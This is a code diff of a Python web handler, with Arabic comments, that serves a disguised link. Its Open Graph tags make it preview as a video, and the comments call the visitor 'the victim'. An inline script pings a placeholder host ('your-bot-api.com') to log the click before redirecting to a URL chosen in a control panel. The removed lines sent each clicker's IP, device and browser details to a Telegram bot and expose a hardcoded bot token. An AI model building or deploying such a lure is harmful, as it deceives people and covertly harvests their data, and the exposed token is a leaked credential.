@@ -1,44 +1,54 @@
 from http.server import BaseHTTPRequestHandler
 import json
-import requests
 
-# بياناتك الثابتة
-TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
-CHAT_ID = "5811700860"
+# قاعدة بيانات مؤقتة (سيتم تخزين الرابط هنا)
+# ملاحظة: في Vercel يفضل استخدام قاعدة بيانات حقيقية، لكن للتبسيط سنعتمد الاستجابة المباشرة
+db = {"url": "https://tiktok.com"}
 
 class handler(BaseHTTPRequestHandler):
     def do_POST(self):
-        try:
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
+        # هذه الجزئية لاستقبال الرابط من لوحة التحكم
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        data = json.loads(post_data)
+        db["url"] = data.get("targetUrl", "https://tiktok.com")
+        
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps({"status": "success"}).encode())
 
-            device = data.get('device', {})
-            action_type = data.get('action', 'نشاط غير معروف')
-
-            # تنسيق الرسالة اللي بتوصلك في التليجرام
-            message = (
-                "🚨 ** تم رصد ضغطة على الرابط! ** 🚨\n"
-                "━━━━━━━━━━━━━━━\n"
-                f"📝 **النوع:** {action_type}\n"
-                f"🌐 **الـ IP:** `{device.get('ip', 'N/A')}`\n"
-                f"📱 **الجهاز:** {device.get('platform', 'N/A')}\n"
-                f"🖥 **الشاشة:** {device.get('screen', 'N/A')}\n"
-                f"🔍 **المتصفح:** {device.get('userAgent')[:60]}...\n"
-                "━━━━━━━━━━━━━━━"
-            )
-
-            # الإرسال للبوت
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
-            )
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "success"}).encode())
-
-        except Exception as e:
-            self.send_response(500)
-            self.end_headers()
+    def do_GET(self):
+        # هذه الجزئية هي ما يراه الضحية عند فتح الرابط
+        target = db["url"]
+        
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        
+        # هنا التمويه: نضع Meta Tags تجعل الرابط يظهر كفيديو طبيعي في المعاينة
+        html = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Video Preview</title>
+            <meta property="og:title" content="شاهد هذا المقطع">
+            <meta property="og:description" content="مقطع فيديو مميز">
+            <meta property="og:image" content="https://path-to-fake-thumbnail.jpg">
+            <meta name="twitter:card" content="summary_large_image">
+            <script>
+                // هنا نضع كود التلغيم (سحب البيانات) قبل التحويل
+                fetch('https://your-bot-api.com/log?info=victim_clicked'); 
+                
+                // التحويل إلى الرابط الذي وضعته في لوحة التحكم بعد ثانية واحدة
+                setTimeout(() => {{
+                    window.location.href = "{target}";
+                }}, 1000);
+            </script>
+        </head>
+        <body style="background: black;">
+            <p style="color: white; text-align: center; margin-top: 20%;">جاري تحميل الفيديو...</p>
+        </body>
+        </html>
+        """
+        self.wfile.write(html.encode())
